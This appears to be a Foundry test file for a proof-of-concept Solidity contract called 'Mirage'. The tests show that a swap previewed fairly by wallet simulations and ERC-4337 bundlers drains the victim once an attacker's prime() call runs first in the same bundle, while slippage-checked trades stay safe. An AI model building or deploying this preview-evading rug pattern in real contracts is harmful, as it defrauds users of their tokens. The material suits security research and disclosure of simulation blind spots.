// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {Mirage, IERC20} from "../src/Mirage.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 v) external { balanceOf[to] += v; }
    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s] = v; return true; }
    function transfer(address t, uint256 v) external returns (bool) { balanceOf[msg.sender] -= v; balanceOf[t] += v; return true; }
    function transferFrom(address f, address t, uint256 v) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= v;
        balanceOf[f] -= v; balanceOf[t] += v; return true;
    }
}

contract MirageTest is Test {
    MockERC20 token;
    Mirage mirage;
    address user = address(0x5E4);
    address attacker = address(0xA77acc);
    uint256 constant AMOUNT = 1_000_000 ether;

    function setUp() public {
        token = new MockERC20();
        mirage = new Mirage(IERC20(address(token)), attacker);
        token.mint(user, AMOUNT);
        token.mint(address(mirage), AMOUNT); // liquidity to pay out the fair quote
        vm.prank(user);
        token.approve(address(mirage), type(uint256).max);
    }

    /// EXACTLY what a wallet preview / aggregator quote / oracle eth_call does: an isolated call.
    /// A fresh test = a fresh transaction = fresh transient state = what every simulator sees.
    function test_1_everySimulatorSeesAFairSwap() public view {
        uint256 previewedOut = mirage.getAmountOut(AMOUNT);
        assertEq(previewedOut, AMOUNT, "isolated simulation shows a fair 1:1 swap");
    }

    /// EXACTLY what executes on-chain when the attacker's `prime()` is a sibling call in the bundle
    /// (e.g. a prior 4337 userOp, a prior multicall step, or an MEV sandwich front-run).
    function test_2_theSameSwapExecutesAsARug() public {
        // sanity: the honest preview, taken in isolation moments earlier, promised AMOUNT out
        uint256 promised = _isolatedPreview(AMOUNT);
        assertEq(promised, AMOUNT, "user was shown a fair 1:1 quote");

        // --- the real transaction/bundle: prime() runs first, then the victim's swap ---
        mirage.prime();
        vm.prank(user);
        uint256 actualOut = mirage.swap(AMOUNT, user);

        // the swap the user approved, executed, drained them
        assertEq(actualOut, AMOUNT / 1_000_000, "user actually received dust");
        assertEq(token.balanceOf(attacker), AMOUNT - AMOUNT / 1_000_000, "attacker took the rest");
        assertLt(actualOut, promised / 1000, "execution diverged catastrophically from the preview");
    }

    /// Helper that performs the preview the way a wallet does: an isolated, side-effect-free read.
    function _isolatedPreview(uint256 amountIn) internal view returns (uint256) {
        return mirage.getAmountOut(amountIn);
    }

    /// Faithful ERC-4337 model: two userOps from DIFFERENT senders in ONE handleOps transaction,
    /// sharing transient storage. The bundler AND the victim's wallet each simulated the victim's
    /// swap userOp in ISOLATION and saw a fair 1:1 — yet on-chain it is bundled behind the
    /// attacker's innocuous `prime` userOp, and rugs. Per-userOp simulation is structurally blind.
    function test_3_crossUserOpBundleDefeatsPerUserOpSimulation() public {
        // (a) what the bundler's per-userOp sim AND the wallet preview see for the victim's swap, alone:
        uint256 simulated = mirage.getAmountOut(AMOUNT);
        assertEq(simulated, AMOUNT, "victim's swap userOp simulates as a fair 1:1 in isolation");

        // (b) the on-chain bundle: [attacker.prime userOp] then [victim.swap userOp], one transaction:
        vm.prank(attacker);
        mirage.prime(); // attacker's userOp — innocuous, cheap, invisible to the victim's sim
        vm.prank(user);
        uint256 executed = mirage.swap(AMOUNT, user); // victim's userOp — now runs primed

        assertEq(executed, AMOUNT / 1_000_000, "victim rugged despite a clean per-userOp simulation");
        assertEq(token.balanceOf(attacker), AMOUNT - AMOUNT / 1_000_000, "attacker took the spread");
    }

    /// THE HONEST LIMIT: a slippage-checked trade is SAFE — the primed rug reverts at `minOut`.
    function test_4_slippageCheckedTradeIsSafe() public {
        uint256 previewed = mirage.getAmountOut(AMOUNT); // wallet showed 1:1
        uint256 minOut = previewed * 99 / 100;           // user signs 1% slippage

        mirage.prime();
        vm.prank(user);
        vm.expectRevert(bytes("slippage"));
        mirage.swapWithMinOut(AMOUNT, minOut, user);     // primed dust < minOut -> reverts. Safe.
    }

    /// WHERE IT'S LETHAL: a preview-trusting action with no user-side backstop (deposit/migrate/claim).
    function test_5_previewTrustingActionIsRugged() public {
        uint256 previewedShares = mirage.getAmountOut(AMOUNT); // wallet preview: "you get 1:1 shares"
        assertEq(previewedShares, AMOUNT);

        mirage.prime();
        vm.prank(user);
        uint256 minted = mirage.deposit(AMOUNT);

        assertEq(minted, AMOUNT / 1_000_000, "user minted dust shares");
        assertEq(mirage.shares(attacker), AMOUNT - AMOUNT / 1_000_000, "attacker got the rest - no backstop");
    }
}
